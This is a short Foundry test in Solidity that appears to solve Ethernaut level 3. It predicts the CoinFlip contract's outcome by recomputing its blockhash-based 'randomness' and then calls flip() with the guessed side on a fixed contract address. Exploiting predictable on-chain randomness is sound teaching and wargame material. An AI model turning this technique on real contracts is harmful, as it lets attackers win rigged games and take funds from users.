// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/ethernaut/level3/CoinFlip.sol";

contract Level3 is Test {
    CoinFlip level3;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        level3 = CoinFlip(0x197a424EB15b54b00fe89ba34AeC48a4dCF28D22);
    }

    function testExploit() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = level3.flip(side);
        console.log(result); 
    }

}
